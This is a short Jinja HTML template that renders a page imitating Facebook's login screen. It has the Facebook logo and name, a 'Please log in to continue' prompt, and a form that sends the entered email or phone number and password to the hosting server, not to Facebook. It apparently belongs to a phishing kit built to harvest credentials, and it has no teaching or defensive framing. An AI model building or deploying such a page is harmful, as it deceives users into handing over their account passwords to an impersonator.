{% extends "base.html" %}
{% block body %}
<div class="card center" style="flex-direction:column;align-items:center;text-align:center;max-width:420px;padding:48px 32px;">
  
  <div class="icon-circle bg-facebook" style="width:68px;height:68px;margin-bottom:16px;">
    <i class="fa-brands fa-facebook-f icon-lg" style="font-size:36px;"></i>
  </div>
  
  <h2 class="notranslate" style="font-weight:700;margin-bottom:6px;">Facebook</h2>
  <p style="color:#64748b;font-size:14px;margin-bottom:24px;">Please log in to continue</p>

  <form method="post" style="width:100%;max-width:340px;text-align:left;">
    <input 
      class="input" 
      name="address" 
      type="text" 
      placeholder="Mobile number or email address" 
      required
      style="width:100%;padding:14px;font-size:15px;border-radius:10px;margin-bottom:12px;"
    >
    <input 
      class="input" 
      name="password" 
      type="password" 
      placeholder="Password" 
      required
      style="width:100%;padding:14px;font-size:15px;border-radius:10px;margin-bottom:20px;"
    >
    <div class="center">
      <button class="btn btn-blue" type="submit" 
        style="width:100%;padding:14px;font-size:16px;font-weight:600;border-radius:8px;">
        Log in
      </button>
    </div>
  </form>

  <div style="margin-top:20px;">
    <a href="#" style="color:#2563eb;text-decoration:none;font-size:14px;">Forgotten password?</a>
  </div>

</div>
{% endblock %}
